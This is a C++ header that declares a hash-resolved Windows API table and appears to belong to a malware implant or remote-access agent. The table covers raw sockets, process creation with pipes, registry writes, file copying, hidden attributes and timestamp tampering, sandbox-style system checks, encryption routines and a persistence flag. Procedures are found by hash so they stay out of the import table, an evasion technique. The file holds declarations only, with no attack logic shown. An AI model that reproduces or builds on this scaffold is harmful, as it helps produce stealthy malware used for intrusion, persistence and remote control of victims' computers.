#pragma once

#include "Core/ntdefs.h"
#include "Crypto/hashing.h"
#include <wininet.h>

//WININET TYPEDEFS
typedef HINTERNET (WINAPI *_InternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *_InternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef HINTERNET (WINAPI *_HttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
typedef BOOL      (WINAPI *_HttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL      (WINAPI *_InternetCloseHandle)(HINTERNET);

//WINSOCK2 TYPEDEFS
typedef int (WSAAPI *_WSAStartup)(WORD, LPWSADATA);
typedef SOCKET (WSAAPI *_socket)(int, int, int);
typedef unsigned long (WSAAPI *_inet_addr)(const char*);
typedef u_short (WSAAPI *_htons)(u_short);
typedef int (WSAAPI *_connect)(SOCKET, const struct sockaddr*, int);
typedef int (WSAAPI *_recv)(SOCKET, char*, int, int);
typedef int (WSAAPI *_send)(SOCKET, const char*, int, int);
typedef int (WSAAPI *_closesocket)(SOCKET);
typedef int (WSAAPI *_WSACleanup)(void);
typedef int (WSAAPI *_setsockopt)(SOCKET, int, int, const char*, int);
typedef int (WSAAPI *_WSAGetLastError)(void);

//Kernel32 TYPEDEFS
typedef BOOL (WINAPI *_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI * _CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL (WINAPI *_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *_CloseHandle)(HANDLE);
typedef DWORD (WINAPI *_GetTickCount)(void);
typedef void (WINAPI *_GetSystemInfo)(LPSYSTEM_INFO);
typedef BOOL (WINAPI *_GlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef BOOL (WINAPI *_SetHandleInformation)(HANDLE, DWORD, DWORD);
typedef HANDLE (WINAPI *_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef HANDLE (WINAPI *_CreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *_CopyFileW)(LPCWSTR, LPCWSTR, BOOL);
typedef BOOL (WINAPI *_SetFileAttributesW)(LPCWSTR, DWORD);
typedef DWORD (WINAPI *_GetEnvironmentVariableW)(LPCWSTR, LPWSTR, DWORD);
typedef DWORD (WINAPI *_GetModuleFileNameW)(HMODULE, LPWSTR, DWORD);
typedef BOOL (WINAPI *_SetFileTime)(HANDLE, const FILETIME*, const FILETIME*, const FILETIME*);
typedef BOOL (WINAPI *_GetFileTime)(HANDLE, LPFILETIME, LPFILETIME, LPFILETIME);
typedef UINT (WINAPI *_GetSystemDirectoryW)(LPWSTR, UINT);
typedef LPWSTR (WINAPI *_GetCommandLineW)(void);
typedef UINT (WINAPI *_SetErrorMode)(UINT);
typedef PVOID (WINAPI *_AddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);
typedef VOID (WINAPI *_ExitProcess)(UINT);
typedef HANDLE (WINAPI *_CreateMutexW)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR);
typedef HANDLE (WINAPI *_GetProcessHeap)(void);

//Advapi32 TYPEDEFS
typedef LSTATUS (WINAPI *_RegCreateKeyExW)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, const LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LSTATUS (WINAPI *_RegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LSTATUS (WINAPI *_RegCloseKey)(HKEY);
typedef BOOL (WINAPI *_LookupAccountSidW)(LPCWSTR, PSID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PSID_NAME_USE);


//BCrypt TYPEDEFS
typedef NTSTATUS (WINAPI *_BCryptOpenAlgorithmProvider)(PVOID*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS (WINAPI *_BCryptCloseAlgorithmProvider)(PVOID, ULONG);
typedef NTSTATUS (WINAPI *_BCryptGenRandom)(PVOID, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *_BCryptImportKeyPair)(PVOID, PVOID, LPCWSTR, PVOID*, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *_BCryptGenerateSymmetricKey)(PVOID, PVOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *_BCryptEncrypt)(PVOID, PUCHAR, ULONG, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, PULONG, ULONG);
typedef NTSTATUS (WINAPI *_BCryptDecrypt)(PVOID, PUCHAR, ULONG, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, PULONG, ULONG);
typedef NTSTATUS (WINAPI *_BCryptDestroyKey)(PVOID);
typedef NTSTATUS (WINAPI *_BCryptSetProperty)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *_BCryptGetProperty)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, PULONG, ULONG);

//ntdll TYPEDEFS
typedef PVOID (WINAPI *_RtlAllocateHeap)(PVOID, ULONG, SIZE_T);
typedef BOOLEAN (WINAPI *_RtlFreeHeap)(PVOID, ULONG, PVOID);


//API TABLE
struct API_TABLE {
    // WinInet
    _InternetOpenA        InternetOpenA;
    _InternetConnectA     InternetConnectA;
    _HttpOpenRequestA     HttpOpenRequestA;
    _HttpSendRequestA     HttpSendRequestA;
    _InternetCloseHandle  InternetCloseHandle;

    // Winsock2
    _WSAStartup  WSAStartup;
    _socket      socket;
    _inet_addr   inet_addr;
    _htons       htons;
    _connect     connect;
    _recv        recv;
    _send        send;
    _closesocket closesocket;
    _WSACleanup  WSACleanup;
    _setsockopt  setsockopt;
    _WSAGetLastError    WSAGetLastError;
    
    // Kernel32
    _CreateProcessA         CreateProcessA;
    _CreateProcessW         CreateProcessW;
    _CreatePipe             CreatePipe;
    _ReadFile               ReadFile;
    _CloseHandle            CloseHandle;
    _GetTickCount           GetTickCount;
    _GetSystemInfo          GetSystemInfo;
    _GlobalMemoryStatusEx   GlobalMemoryStatusEx;
    _SetHandleInformation   SetHandleInformation;
    _CreateFileA            CreateFileA;
    _CreateFileW            CreateFileW;
    _CopyFileW              CopyFileW;
    _SetFileAttributesW     SetFileAttributesW;
    _GetEnvironmentVariableW GetEnvironmentVariableW;
    _GetModuleFileNameW     GetModuleFileNameW;
    _GetSystemDirectoryW    GetSystemDirectoryW;
    _SetFileTime            SetFileTime;
    _GetFileTime            GetFileTime;
    _GetCommandLineW        GetCommandLineW;
    _SetErrorMode           SetErrorMode;
    _AddVectoredExceptionHandler    AddVectoredExceptionHandler;
    _ExitProcess            ExitProcess;
    _CreateMutexW           CreateMutexW;
    _GetProcessHeap         GetProcessHeap;

    // Advapi32
    _RegCreateKeyExW        RegCreateKeyExW;
    _RegSetValueExW         RegSetValueExW;
    _RegCloseKey            RegCloseKey;
    _LookupAccountSidW      LookupAccountSidW;

    //BCrypt
    _BCryptOpenAlgorithmProvider    BCryptOpenAlgorithmProvider;
    _BCryptCloseAlgorithmProvider   BCryptCloseAlgorithmProvider;
    _BCryptGenRandom                BCryptGenRandom;
    _BCryptImportKeyPair            BCryptImportKeyPair;
    _BCryptGenerateSymmetricKey     BCryptGenerateSymmetricKey;
    _BCryptEncrypt                  BCryptEncrypt;
    _BCryptDecrypt                  BCryptDecrypt;
    _BCryptDestroyKey               BCryptDestroyKey;
    _BCryptSetProperty              BCryptSetProperty;
    _BCryptGetProperty              BCryptGetProperty;


    //ntdll 
    _RtlAllocateHeap        RtlAllocateHeap;
    _RtlFreeHeap            RtlFreeHeap;

    // Capability flags (optional subsystems)
    bool hasWinInet;
    bool hasPersistence;
}; 

// Access the global API table singleton
API_TABLE& GetAPI();

// Core resolution functions
bool ResolveAPIs();
PVOID GetProcAddressByHash(HMODULE hModule, QWORD targetHash);
PVOID GetModuleBaseByHash(QWORD targetHash);
